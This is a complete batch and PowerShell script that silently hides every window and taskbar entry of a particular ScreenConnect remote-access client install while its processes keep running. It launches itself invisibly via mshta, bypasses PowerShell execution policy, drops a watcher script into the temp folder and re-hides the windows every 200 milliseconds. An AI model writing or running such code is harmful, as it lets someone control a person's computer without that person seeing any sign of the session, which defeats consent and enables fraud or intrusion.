@echo off
setlocal EnableExtensions

REM ============================================================
REM  Hide ALL on-screen UI from this ScreenConnect install only
REM  Folder: C:\Program Files (x86)\ScreenConnect Client (fd944d6092d0e488)
REM  Processes keep running in Task Manager — nothing on screen/taskbar
REM ============================================================
set "SC_LAUNCH=%~f0"
set "SC_WATCHER=%TEMP%\sc_hide_watcher.ps1"
REM ============================================================

if /I not "%~1"=="__RUN__" (
    mshta "javascript:var s=new ActiveXObject('WScript.Shell'); s.Run('cmd /c \"\"\"%SC_LAUNCH%\"\" __RUN__\"',0,false);close()"
    exit /b 0
)

set "BATCH_SELF=%~f0"

powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
    "try { ^
        $raw = Get-Content -LiteralPath $env:BATCH_SELF -Raw; ^
        if ($raw -notmatch '(?ms)^#PS1#\r?\n(.*\S)\s*$') { throw 'Script block not found.' }; ^
        $Matches[1] | Out-File -LiteralPath $env:SC_WATCHER -Encoding UTF8 -Force; ^
        $running = Get-CimInstance Win32_Process -Filter ""Name='powershell.exe'"" | Where-Object { $_.CommandLine -like '*sc_hide_watcher.ps1*' }; ^
        if (-not $running) { ^
            Start-Process powershell.exe -ArgumentList '-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',$env:SC_WATCHER -WindowStyle Hidden; ^
        } ^
     } catch { ^
        $_ | Out-File -FilePath ($env:TEMP + '\sc_hide.log') -Encoding UTF8 -Force ^
     }"

exit /b 0

#PS1#
$ErrorActionPreference = 'SilentlyContinue'

$ScInstallDir = 'C:\Program Files (x86)\ScreenConnect Client (fd944d6092d0e488)'

if (-not ([System.Management.Automation.PSTypeName]'ScWin32').Type) {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public static class ScWin32 {
    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    [DllImport("user32.dll")]
    public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

    [DllImport("user32.dll")]
    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

    [DllImport("user32.dll")]
    public static extern bool IsWindowVisible(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    public static extern int GetWindowLong(IntPtr hWnd, int nIndex);

    [DllImport("user32.dll")]
    public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern int GetWindowTextLength(IntPtr hWnd);

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    public const int GWL_EXSTYLE = -20;
    public const int WS_EX_TOOLWINDOW = 0x00000080;
    public const int WS_EX_APPWINDOW = 0x00040000;
    public const int SW_HIDE = 0;
}
"@
}

function Get-InstallProcessIds {
    $all = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue)
    if ($all.Count -eq 0) { return @() }

    $pids = New-Object System.Collections.Generic.HashSet[int]

    foreach ($proc in $all) {
        if ($proc.ExecutablePath -and $proc.ExecutablePath.StartsWith($ScInstallDir, [StringComparison]::OrdinalIgnoreCase)) {
            [void]$pids.Add([int]$proc.ProcessId)
        }
    }

    $changed = $true
    while ($changed) {
        $changed = $false
        foreach ($proc in $all) {
            $pid = [int]$proc.ProcessId
            if ($pids.Contains($proc.ParentProcessId) -and -not $pids.Contains($pid)) {
                [void]$pids.Add($pid)
                $changed = $true
            }
        }
    }

    return @($pids)
}

function Hide-InstallUI {
    param([int[]]$TargetPids)

    if ($TargetPids.Count -eq 0) { return }

    $script:targetPids = $TargetPids

    [ScWin32]::EnumWindows({
        param($hWnd, $lParam)

        [uint32]$windowPid = 0
        [void][ScWin32]::GetWindowThreadProcessId($hWnd, [ref]$windowPid)

        if ($script:targetPids -contains [int]$windowPid) {
            $len = [ScWin32]::GetWindowTextLength($hWnd)
            if ($len -ge 0) {
                $style = [ScWin32]::GetWindowLong($hWnd, [ScWin32]::GWL_EXSTYLE)
                $style = ($style -bor [ScWin32]::WS_EX_TOOLWINDOW) -band (-bnot [ScWin32]::WS_EX_APPWINDOW)
                [void][ScWin32]::SetWindowLong($hWnd, [ScWin32]::GWL_EXSTYLE, $style)
                [void][ScWin32]::ShowWindow($hWnd, [ScWin32]::SW_HIDE)
            }
        }

        return $true
    }, [IntPtr]::Zero) | Out-Null
}

while ($true) {
    $pids = Get-InstallProcessIds
    Hide-InstallUI -TargetPids $pids
    Start-Sleep -Milliseconds 200
}
